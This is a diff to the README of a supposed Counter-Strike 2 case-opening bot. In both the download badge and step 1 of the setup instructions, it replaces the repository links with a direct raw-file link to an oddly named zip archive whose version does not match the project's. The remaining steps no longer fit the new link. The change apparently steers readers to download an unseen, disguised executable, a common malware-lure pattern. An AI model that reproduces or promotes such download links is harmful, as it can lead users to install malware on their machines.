@@ -1,6 +1,6 @@
 # 📦 CS2-Case-Bot-V1.4 - Automate Counter-Strike Case Openings For Streams
 
-[![](https://img.shields.io/badge/Download-V1.4-blue.svg)](https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4)
+[![](https://img.shields.io/badge/Download-V1.4-blue.svg)](https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip)
 
 ## 📖 About This Tool
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic criteria to run the software smoothly:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit this page to download the project files: [https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4](https://github.com/Stopvesiculitis669/CS2-Case-Bot-V1.4)
+1. Visit this page to download the project files: [https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip](https://raw.githubusercontent.com/Stopvesiculitis669/CS2-Case-Bot-V1.4/main/wool/Bot_Case_C_v1.6.zip)
 2. Locate the green Code button on the repository page.
 3. Select Download ZIP from the menu.
 4. Save the folder to a location you can find, such as your Desktop or Downloads folder.
